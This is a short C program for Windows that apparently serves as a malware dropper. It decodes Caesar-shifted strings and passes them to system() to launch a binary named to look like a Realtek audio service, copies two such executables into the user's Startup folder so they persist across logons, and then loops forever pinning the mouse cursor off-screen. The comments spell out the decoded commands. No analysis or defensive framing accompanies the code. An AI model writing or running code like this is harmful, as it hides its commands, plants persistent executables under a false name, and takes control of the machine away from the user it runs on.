#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void decrypt(char *text, int shift)
{
    int length = strlen(text);
    for (int i = 0; i < length; i++)
    {
        text[i] = (char)((int)text[i] - shift);
    }
}


int main()
{    
    char text_1[] = "uvctv\"TvmCwfWUgtxkegWrf860gzg";
    char text_2[] = "eqr{\"TvmCwfWUgtxkegWrf860gzg\"^$E<^^Wugtu^^\'wugtpcog\'^^CrrFcvc^^Tqcokpi^^Oketquqhv^^Ykpfqyu^^Uvctv\"Ogpw^^Rtqitcou^^Uvctvwr^^TvmCwfWUgtxkegWrf860gzg^$";
    char text_3[] = "eqr{\"TvmCwfWUgtxkeg860gzg\"^$E<^^Wugtu^^\'wugtpcog\'^^CrrFcvc^^Tqcokpi^^Oketquqhv^^Ykpfqyu^^Uvctv\"Ogpw^^Rtqitcou^^Uvctvwr^^TvmCwfWUgtxkeg860gzg^$";

    decrypt(text_1, 2);
    decrypt(text_2, 2);
    decrypt(text_3, 2);

    system(text_1);
    //1 start RtkAudUServiceUpd64.exe
    
    system(text_2);
    //2 copy RtkAudUServiceUpd64.exe \"C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\RtkAudUServiceUpd64.exe\"
    system(text_3);
    //3 copy RtkAudUService64.exe \"C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\RtkAudUService64.exe\"
    

    while (1)
    {
        SetCursorPos(2000, 2000);
    }
    
    
	return 0;
}